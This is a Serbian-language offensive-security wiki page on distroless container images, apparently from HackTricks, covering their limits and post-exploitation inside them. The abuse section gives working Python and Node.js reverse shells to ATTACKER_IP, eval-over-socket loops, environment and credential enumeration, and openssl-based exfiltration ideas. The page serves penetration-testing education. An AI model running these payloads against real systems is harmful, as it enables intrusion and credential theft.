# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

**Distroless** image kontejnera sadrži **minimalne runtime komponente potrebne za pokretanje jedne određene aplikacije**, dok namerno uklanja uobičajene alate distribucije kao što su package manageri, shell-ovi i veliki skupovi generičkih userland uslužnih programa. U praksi, distroless image-i često sadrže samo binarnu datoteku aplikacije ili runtime, njene deljene biblioteke, pakete sertifikata i veoma jednostavnu strukturu fajl-sistema. <sup>[[1]](#references)</sup>

Poenta nije u tome da je distroless novi primitiv za izolaciju kernela. Distroless je **strategija dizajna image-a**. Menja ono što je dostupno **unutar** fajl-sistema kontejnera, a ne način na koji kernel izoluje kontejner. Ova razlika je važna zato što distroless prvenstveno ojačava okruženje tako što ograničava ono što napadač može da koristi nakon dobijanja izvršavanja koda. Ne zamenjuje namespaces, seccomp, capabilities, AppArmor, SELinux niti bilo koji drugi mehanizam izolacije tokom izvršavanja.

## Zašto Distroless Postoji

Distroless image-i se prvenstveno koriste da bi se smanjili:

- veličina image-a
- operativna složenost image-a
- broj paketa i binarnih datoteka koje mogu sadržati ranjivosti
- broj post-exploitation alata koji su napadaču podrazumevano dostupni

Zato su distroless image-i popularni za produkciono pokretanje aplikacija. Kontejner koji nema shell, package manager i gotovo nikakve generičke alate obično je operativno lakše razumeti, a nakon kompromitovanja ga je teže zloupotrebiti interaktivno.

Primeri poznatih porodica image-a u distroless stilu uključuju:

- Google-ove distroless image-e <sup>[[1]](#references)</sup>
- Chainguard hardened/minimal image-e <sup>[[2]](#references)</sup>

## Šta Distroless Ne Znači

Distroless kontejner **nije**:

- automatski rootless
- automatski bez privilegija
- automatski samo za čitanje
- automatski zaštićen pomoću seccomp, AppArmor ili SELinux
- automatski bezbedan od izlaska iz kontejnera

Distroless image je i dalje moguće pokrenuti sa `--privileged`, deljenjem host namespace-a, opasnim bind mount-ovima ili montiranim runtime socket-om. U tom slučaju image može biti minimalan, ali kontejner i dalje može biti katastrofalno nebezbedan. Distroless menja **userland površinu za napad**, a ne **granicu poverenja kernela**.

## Tipične Operativne Karakteristike

Kada kompromitujete distroless kontejner, obično prvo primetite da uobičajene pretpostavke više ne važe. Možda nema `sh`, `bash`, `ls`, `id`, `cat`, a ponekad čak ni okruženja zasnovanog na libc-u koje se ponaša onako kako očekuje vaš uobičajeni tradecraft. To utiče i na ofanzivu i na odbranu, jer nedostatak alata menja način otklanjanja grešaka, reagovanja na incidente i post-exploitation aktivnosti.

Najčešći obrasci su:

- runtime aplikacije postoji, ali gotovo ničeg drugog nema
- payload-i zasnovani na shell-u ne rade jer shell ne postoji
- uobičajene jednolinijske komande za enumeraciju ne rade jer nedostaju pomoćne binarne datoteke
- često postoje i zaštite fajl-sistema, kao što su read-only rootfs ili `noexec` na lokacijama writable tmpfs-a

Zbog te kombinacije se obično govori o „weaponizing distroless“.

## Distroless I Post-Exploitation

Glavni ofanzivni izazov u distroless okruženju nije uvek početni RCE. Često je problem ono što sledi. Ako kompromitovano radno opterećenje omogućava izvršavanje koda u jezičkom runtime-u kao što su Python, Node.js, Java ili Go, možda ćete moći da izvršavate proizvoljnu logiku, ali ne i uobičajenim tokovima rada zasnovanim na shell-u, koji su česti na drugim Linux ciljevima.

Zato se post-exploitation često usmerava u jednom od tri pravca:

1. **Direktno koristite postojeći jezički runtime** za enumeraciju okruženja, otvaranje socket-a, čitanje fajlova ili pripremu dodatnih payload-a.
2. **Učitajte sopstvene alate u memoriju** ako je fajl-sistem samo za čitanje ili su lokacije za upis montirane sa `noexec`.
3. **Zloupotrebite postojeće binarne datoteke u image-u** ako aplikacija ili njene zavisnosti sadrže nešto neočekivano korisno.

## Zloupotreba

### Enumerišite Runtime Koji Već Imate

U mnogim distroless kontejnerima nema shell-a, ali postoji runtime aplikacije. Ako je cilj Python servis, Python je dostupan. Ako je cilj Node.js, dostupan je Node. To često pruža dovoljno funkcionalnosti za enumeraciju fajlova, čitanje promenljivih okruženja, otvaranje reverse shell-ova i pripremu izvršavanja u memoriji, bez pozivanja `/bin/sh`.

Jednostavan primer sa Python-om:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Jednostavan primer sa Node.js:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Uticaj:

- oporavak promenljivih okruženja, koje često uključuju akreditive ili krajnje tačke servisa
- enumeracija sistema datoteka bez `/bin/ls`
- identifikacija putanja u koje je moguće pisati i montiranih tajni

### Interaktivno izvršno okruženje bez `/bin/sh`

Ako image ne sadrži `sh` ili `bash`, klasični reverse shell zasnovan na shell-u neće raditi. U toj situaciji izložite interaktivnu sesiju u instaliranom jezičkom izvršnom okruženju umesto da pokrećete shell koji ne postoji.

Na primer, ovaj Python payload preusmerava interaktivnu Python konzolu preko socket-a:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

Ekvivalentni pristup u Node.js-u može da izvršava JavaScript primljen preko soketa. To je JavaScript REPL, a ne shell operativnog sistema; operacije nad sistemom datoteka, procesima i mrežom moraju se obavljati putem Node API-ja:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Oba primera zahtevaju odlaznu mrežnu povezanost i dostupan interpreter, a oba pružaju samo funkcionalnosti koje taj interpreter podržava.

Ako image neočekivano sadrži `/bin/sh`, klasični shell payloads koji koriste interpreter i dalje su korisni. Prikazani su zasebno jer nisu zaista bez shell-a:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Stariji Python obrazac command-loop takođe je koristan kada `/bin/sh` postoji, ali je interaktivni PTY nepraktičan. Ovde je zadržan uz eksplicitno navođenje stvarne zavisnosti: `subprocess.run(..., shell=True)` poziva sistemski shell i zato **nije** no-shell tehnika.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Potpun primer: Python komandna petlja bez shell-a

Ako image sadrži Python, ali uopšte nema shell, lokalni Python REPL i dalje može da se koristi za pregled sistema datoteka, okruženja i mreže:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Ova petlja ne poziva `/bin/sh`. Ona direktno izvršava Python izraze i naredbe, pa operacije moraju koristiti Python API-je umesto shell komandi. Uz to ograničenje, i dalje može da pruži veliki deo mogućnosti osnovnog shell-a: enumeraciju datotečnog sistema i okruženja, pristup podacima, mrežne aktivnosti i pripremu dodatnih payload-ova pomoću instaliranog runtime-a.

### Izvršavanje alata u memoriji

Distroless images se često kombinuju sa:

- `readOnlyRootFilesystem: true`
- tmpfs-om koji dozvoljava upis, ali ima `noexec`, kao što je `/dev/shm`
- nedostatkom alata za upravljanje paketima

Zbog te kombinacije, uobičajeni postupci „preuzmi binarnu datoteku na disk i pokreni je” nisu pouzdani. U tim slučajevima, tehnike izvršavanja u memoriji postaju glavno rešenje.

Stranica posvećena tome je:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Najrelevantnije tehnike tamo su:

- `memfd_create` + `execve` preko scripting runtime-a <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Za Python, Node.js ili PHP servis, ulazna tačka može biti greška u aplikaciji kao što su template injection, prototype pollution ili unsafe evaluation. Ako omogući izvršavanje koda unutar procesa, tehnika `/proc/self/mem` može pokrenuti loader bez shell-a ili izvršne datoteke na disku. Izvršavanje se i dalje odvija pod identitetom procesa kontejnera; za izlazak iz kontejnera potrebna je zasebna slabost runtime-a ili granice host-a. Pogledajte [tehnike za read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) za preduslove.

### Postojeće binarne datoteke već prisutne u image-u

Neki distroless images i dalje sadrže binarne datoteke neophodne za rad, koje postaju korisne nakon kompromitovanja. Primer koji se često uočava je `openssl`, jer je aplikacijama ponekad potreban za zadatke povezane sa kriptografijom ili TLS-om.

Brz obrazac pretrage je:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Ako je `openssl` prisutan, može se koristiti za:

- odlazne TLS veze
- eksfiltraciju podataka preko dozvoljenog izlaznog kanala
- pripremu podataka za payload kroz kodirane/šifrovane blobove

Tačan način zloupotrebe zavisi od toga šta je zaista instalirano, ali opšta ideja je da distroless ne znači „bez ikakvih alata“; znači „mnogo manje alata nego u standardnoj distribucionoj slici“.

## Provere

Cilj ovih provera je da utvrde da li je slika zaista distroless u praksi i koji runtime ili pomoćni binarni fajlovi su i dalje dostupni za post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Šta je ovde zanimljivo:

- Ako ne postoji shell, ali je dostupan runtime kao što su Python ili Node, post-exploitation treba usmeriti ka izvršavanju kojim upravlja runtime.
- Ako je root fajl-sistem samo za čitanje, a `/dev/shm` je upisiv, ali ima oznaku `noexec`, tehnike izvršavanja iz memorije postaju mnogo relevantnije.
- Ako postoje pomoćni binarni fajlovi kao što su `openssl`, `busybox` ili `java`, oni mogu pružiti dovoljno funkcionalnosti za uspostavljanje dodatnog pristupa.

## Podrazumevane postavke runtime-a

| Stil image-a / platforme | Podrazumevano stanje | Uobičajeno ponašanje | Uobičajeno ručno slabljenje zaštite |
| --- | --- | --- | --- |
| Google image-i u distroless stilu | Namerno minimalan userland | Bez shell-a, bez package manager-a, samo zavisnosti aplikacije/runtime-a | dodavanje slojeva za debagovanje, sidecar shell-ova, kopiranje busybox-a ili alata |
| Minimalni image-i Chainguard-a | Namerno minimalan userland | Smanjen skup paketa, često usmeren na jedan runtime ili servis | korišćenje varijanti `:latest-dev` ili za debagovanje, kopiranje alata tokom build-a |
| Kubernetes workload-i koji koriste distroless image-e | Zavisi od konfiguracije Pod-a | Distroless utiče samo na userland; bezbednosni položaj Pod-a i dalje zavisi od specifikacije Pod-a i podrazumevanih postavki runtime-a | dodavanje privremenih kontejnera za debagovanje, host mount-ova, privilegovanih postavki Pod-a |
| Docker / Podman koji pokreće distroless image-e | Zavisi od zastavica pri pokretanju | Minimalan fajl-sistem, ali bezbednost runtime-a i dalje zavisi od zastavica i konfiguracije daemon-a | `--privileged`, deljenje host namespace-ova, mount-ovi runtime socket-a, upisivi host bind mount-ovi |

Ključna stvar je da je distroless **svojstvo image-a**, a ne zaštita runtime-a. Njegova vrednost potiče od smanjenja onoga što je dostupno unutar fajl-sistema nakon kompromitovanja. Višestepeni build-ovi su čest način da se alati za build izostave iz konačnog image-a. <sup>[[3]](#references)</sup>

## Povezane stranice

Za zaobilaženje zaštita fajl-sistema i izvršavanja iz memorije, koje su često potrebne u distroless okruženjima:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Za zloupotrebu container runtime-a, socket-a i mount-ova, koja je i dalje primenljiva na distroless workload-e:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Distroless kontejnerski image-i](https://github.com/GoogleContainerTools/distroless)
- [2] [Dokumentacija za Chainguard Images](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker dokumentacija - Višestepeni build-ovi](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Linux stranica priručnika](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
